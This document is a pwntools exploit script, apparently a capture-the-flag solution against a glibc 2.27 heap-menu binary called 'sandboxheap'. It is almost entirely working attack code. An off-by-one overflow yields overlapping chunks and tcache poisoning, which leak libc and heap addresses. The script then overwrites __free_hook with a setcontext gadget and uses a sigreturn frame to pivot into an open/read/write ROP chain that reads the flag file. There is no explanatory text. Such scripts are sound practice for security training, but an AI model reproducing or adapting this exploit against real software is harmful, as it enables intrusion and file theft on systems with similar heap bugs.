from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug' 
context(os='linux',arch='amd64')
p=process('./sandboxheap')
libc=ELF('./libc-2.27.so')
def add(index,size):
    p.sendlineafter(b'Your choice: ',b'1')
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendlineafter(b'Size: ',str(size).encode())
def show(index):
    p.sendlineafter(b'Your choice: ',b'3')
    p.sendlineafter(b'Index: ',str(index).encode())
def free(index):
    p.sendlineafter(b'Your choice: ',b'4')
    p.sendlineafter(b'Index: ',str(index).encode())
def getinput(content):
    ret=""
    for i in content:
        ret+=bin(i)[2:].rjust(8,'0')[::-1]
    return ret
def edit(index,content):
    p.sendlineafter(b'Your choice: ',b'2')
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendafter(b'Content: ',getinput(content).encode())
def overedit(index,content):
    p.sendlineafter(b'Your choice: ',b'2')
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendafter(b'Content: ',(getinput(content)+"0").encode())
for i in range(7):
    add(i,0xa0)
add(7,0xa8)
add(8,0x28)
add(9,0xa8)
add(14,0x190)
add(15,0x190)
for i in range(7):
    free(i)
free(7)

overedit(8,b'a'*0x20+p64(0xe0))
free(9)
add(0,0x88)
add(1,0x88)
show(1)
p.recvuntil(b'Content: ')
libc_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(libc_addr))
malloc_hook=libc_addr-0x70
libcbase=malloc_hook-libc.sym['__malloc_hook']#sym symbol
print('libcbase',hex(libcbase))
free_hook=libcbase+libc.sym['__free_hook']
print('free_hook',hex(free_hook))
setcontext=libcbase+0x52050
print('setcontext',hex(setcontext))
read_addr=libcbase+libc.symbols['read']
open_addr=libcbase+libc.symbols['open']
write_addr=libcbase+libc.symbols['write']
leave_addr=libcbase+0x00000000000547e3
pop_rax=libcbase+0x000000000001b500
pop_rdi=libcbase+0x000000000002164f
pop_rbp=libcbase+0x00000000000213e3
pop_rsi=libcbase+0x0000000000023a6a
pop_rdx=libcbase+0x0000000000001b96
add(2,0xa0)
edit(1,p64(0)*3+p64(0xb1))
free(8)
edit(1,b'a'*8*4)
show(1)
p.recvuntil(b'Content: ')
p.recvuntil(b'a'*8*4)
heap_addr=u64(p.recv(6).ljust(8,b'\x00'))
print("heap_addr",hex(heap_addr))
addr1=heap_addr+0x2f0#14
addr2=heap_addr+0x490#15
print("addr1",hex(addr1))
print("addr2",hex(addr2))
edit(1,p64(0)*3+p64(0xb1)+p64(free_hook))
add(5,0xa0)
add(6,0xa0)
edit(6,p64(setcontext+53))
frame=SigreturnFrame()
frame.rbp=addr1
frame.rsp=addr1
frame.rip=leave_addr
bframe=bytes(frame)
edit(15,bframe)
gdb.attach(p,'b free')
edit(0,b'flag\x00')
flag_addr=heap_addr+0x160
rop=p64(0xdeadbeef)
rop+=flat([pop_rdi,flag_addr,pop_rsi,0,open_addr])
rop+=flat([pop_rdi,3,pop_rsi,heap_addr+0x20,pop_rdx,0x40,read_addr])
rop+=flat([pop_rdi,1,pop_rsi,heap_addr+0x20,pop_rdx,0x40,write_addr])
edit(14,rop)
free(15)
p.interactive()
    
